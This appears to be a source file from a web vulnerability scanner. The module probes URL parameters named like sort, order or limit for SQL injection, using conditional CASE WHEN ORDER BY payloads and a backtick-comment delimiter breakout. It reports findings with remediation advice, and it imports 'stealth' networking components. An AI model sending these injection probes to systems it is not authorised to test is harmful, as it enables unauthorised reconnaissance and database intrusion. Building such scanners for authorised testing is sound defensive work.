/**
 * SOHE God Rail v3 — Dynamic Identifier Injection Detection Module
 *
 * Targets SQL injection points where standard parameterized query placeholders (? or :name)
 * cannot be used by database drivers:
 * 1. ORDER BY clauses (e.g., sort, order, dir, orderBy)
 * 2. GROUP BY clauses
 * 3. Dynamic column selections
 * 4. Dynamic table names
 * 5. LIMIT / OFFSET clauses
 *
 * Uses conditional sorting, CASE expressions, and syntax manipulation rather
 * than traditional WHERE clause predicates.
 */

import { IAttackModule, ModuleExecutionResult } from './IAttackModule';
import { StrategyContext } from '../engine/StrategyPlanner';
import { GhostNetwork, GhostHttpRequest } from '../stealth/GhostNetwork';
import { AdaptiveResponseOracle } from '../engine/AdaptiveResponseOracle';
import { DataStoreIdentity } from '../DataStoreFingerprinter';
import { ConfirmedFinding } from '../ProofCollector';

export class IdentifierInjectionModule implements IAttackModule {
  readonly name = 'IdentifierInjectionModule';
  readonly description = 'Detects SQL injection in dynamic identifiers (ORDER BY, GROUP BY, column names, LIMIT/OFFSET).';

  shouldExecute(ctx: StrategyContext, _identity: DataStoreIdentity): boolean {
    const p = ctx.parameterName.toLowerCase();
    return (
      p.includes('sort') ||
      p.includes('order') ||
      p.includes('by') ||
      p.includes('dir') ||
      p.includes('column') ||
      p.includes('col') ||
      p.includes('limit') ||
      p.includes('offset') ||
      p.includes('page')
    );
  }

  async execute(
    ctx: StrategyContext,
    network: GhostNetwork,
    oracle: AdaptiveResponseOracle
  ): Promise<ModuleExecutionResult> {
    const findings: ConfirmedFinding[] = [];
    const evidenceLogged: string[] = [];

    // Test 1: Conditional ORDER BY Sorting Expression
    // If param is injected into ORDER BY, passing a conditional CASE expression
    // dynamically flips the sort order between two different columns or ASC/DESC
    const orderByTest = await this.testConditionalOrderBy(ctx, network, oracle);
    if (orderByTest) {
      findings.push(orderByTest);
      return { findings, evidenceLogged };
    }

    // Test 2: In-Clause Identifier Delimiter Breakout
    // Tests if backtick `, double quote ", or bracket ] can break identifier context
    const delimiterTest = await this.testIdentifierDelimiters(ctx, network);
    if (delimiterTest) {
      findings.push(delimiterTest);
      return { findings, evidenceLogged };
    }

    evidenceLogged.push(`Dynamic identifier tests on '${ctx.parameterName}' verified strict column whitelist enforcement.`);
    return { findings, evidenceLogged };
  }

  private async testConditionalOrderBy(
    ctx: StrategyContext,
    network: GhostNetwork,
    oracle: AdaptiveResponseOracle
  ): Promise<ConfirmedFinding | null> {
    // Probe 1: True condition: (CASE WHEN 1=1 THEN 1 ELSE 2 END)
    // Probe 2: False condition: (CASE WHEN 1=2 THEN 1 ELSE 2 END)
    const probeTrue = `(CASE WHEN (1=1) THEN 1 ELSE 2 END)`;
    const probeFalse = `(CASE WHEN (1=2) THEN 1 ELSE 2 END)`;

    const resTrue = await this.sendProbe(ctx, probeTrue, network);
    const resFalse = await this.sendProbe(ctx, probeFalse, network);

    // If both return 200, but their body contents diverge (indicating rows sorted differently)
    if (
      resTrue.status === 200 &&
      resFalse.status === 200 &&
      !oracle.isTrue(resFalse).isTrue &&
      resTrue.body !== resFalse.body
    ) {
      return {
        id: `identifier-orderby-${Date.now()}`,
        vulnerabilityType: 'ORDER BY SQL Injection (Conditional Sort Divergence)',
        severity: 'High',
        confidence: 'Confirmed',
        targetUrl: ctx.baseRequest.url,
        parameter: ctx.parameterName,
        payload: probeTrue,
        description: `Parameter '${ctx.parameterName}' is directly concatenated into an ORDER BY clause. Subqueries and conditional CASE statements manipulate sorting order.`,
        impact: 'Attackers can extract database contents character-by-character using conditional ordering or cause server denial of service.',
        remediation: 'Use a strict server-side whitelist mapping allowed sort keys to database column names.',
        evidence: [
          {
            requestUrl: ctx.baseRequest.url,
            requestMethod: ctx.baseRequest.method,
            requestHeaders: ctx.baseRequest.headers,
            requestBody: ctx.baseRequest.body,
            responseStatus: resTrue.status,
            responseHeaders: resTrue.headers,
            responseBodySnippet: resTrue.body.substring(0, 1000),
            highlightRegions: ['Sorting response diverged between CASE WHEN (1=1) and (1=2)'],
          },
        ],
      };
    }

    return null;
  }

  private async testIdentifierDelimiters(
    ctx: StrategyContext,
    network: GhostNetwork
  ): Promise<ConfirmedFinding | null> {
    // Probe: Append delimiter and SQL comment: ` DESC, (SELECT 1)-- 
    const payload = `${ctx.originalValue}\` DESC-- `;
    const res = await this.sendProbe(ctx, payload, network);

    if (res.body.includes('SQL syntax') || res.body.includes('syntax error') || res.status === 500) {
      // Syntax error indicates identifier delimiter was unescaped
      return {
        id: `identifier-delimiter-${Date.now()}`,
        vulnerabilityType: 'Identifier Delimiter SQL Injection',
        severity: 'High',
        confidence: 'High',
        targetUrl: ctx.baseRequest.url,
        parameter: ctx.parameterName,
        payload,
        description: `Parameter '${ctx.parameterName}' allows identifier quote escaping (\`), revealing direct unparameterized query construction.`,
        impact: 'Arbitrary SQL execution within the identifier context.',
        remediation: 'Validate input against an immutable whitelist of allowed column identifiers.',
        evidence: [
          {
            requestUrl: ctx.baseRequest.url,
            requestMethod: ctx.baseRequest.method,
            requestHeaders: ctx.baseRequest.headers,
            requestBody: ctx.baseRequest.body,
            responseStatus: res.status,
            responseHeaders: res.headers,
            responseBodySnippet: res.body.substring(0, 1000),
            highlightRegions: ['Database syntax error triggered by identifier delimiter'],
          },
        ],
      };
    }

    return null;
  }

  private async sendProbe(ctx: StrategyContext, payload: string, network: GhostNetwork) {
    const req: GhostHttpRequest = JSON.parse(JSON.stringify(ctx.baseRequest));
    const url = new URL(req.url);
    url.searchParams.set(ctx.parameterName, payload);
    req.url = url.toString();
    return await network.executeRequest(req);
  }
}
